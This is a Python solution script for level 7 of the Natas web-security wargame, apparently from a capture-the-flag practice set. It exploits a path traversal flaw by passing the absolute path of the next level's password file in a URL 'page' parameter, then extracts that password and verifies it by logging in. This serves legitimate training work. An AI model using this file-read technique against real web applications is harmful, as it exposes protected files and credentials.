"""
natas7: URL parameters, path traversal
"""

import requests
from natas_utils import *

LEVEL = 7
URL, LOGIN = load_level(LEVEL)

def main():
    # links on the page use URL parameters to specify pages
    # solve by passing an absolute path to password file
    response = requests.get(URL, auth=LOGIN, params={"page": flag_file_abspath(LEVEL + 1)})

    natas8_password = try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

    if natas8_password:
        print("natas8:", natas8_password)
        store_level_password(LEVEL + 1, natas8_password)
    else:
        exit("Failed to get password for the next level.")

if __name__ == "__main__":
    main()